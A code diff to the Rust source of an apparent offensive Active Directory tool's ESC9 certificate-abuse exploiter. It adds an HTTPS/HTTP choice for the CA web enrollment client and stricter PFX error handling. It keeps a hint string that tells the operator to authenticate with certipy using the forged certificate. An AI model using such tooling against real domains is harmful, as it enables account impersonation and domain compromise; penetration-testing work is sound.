@@ -86,9 +86,14 @@ pub struct Esc9Result {
 }
 
 impl Esc9Exploiter {
-    /// Create a new ESC9 exploiter pointed at the given CA web enrollment server
+    /// Create a new ESC9 exploiter pointed at the given CA web enrollment server (HTTPS).
     pub fn new(ca_server: &str) -> Result<Self> {
-        let web_client = WebEnrollmentClient::new(ca_server)?;
+        Self::with_ssl(ca_server, true)
+    }
+
+    /// Create a new ESC9 exploiter with explicit SSL choice.
+    pub fn with_ssl(ca_server: &str, use_ssl: bool) -> Result<Self> {
+        let web_client = WebEnrollmentClient::with_ssl(ca_server, use_ssl)?;
         Ok(Self { web_client })
     }
 
@@ -144,8 +149,8 @@ impl Esc9Exploiter {
             );
         }
 
-        let pfx_data =
-            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());
+        let pfx_data = create_pfx(&cert_data, &private_key, None)
+            .map_err(|e| OverthroneError::Adcs(format!("PFX creation failed: {}", e)))?;
 
         let pkinit_hint = format!(
             "certipy auth -pfx {} -dc-ip <DC_IP> -domain {}",
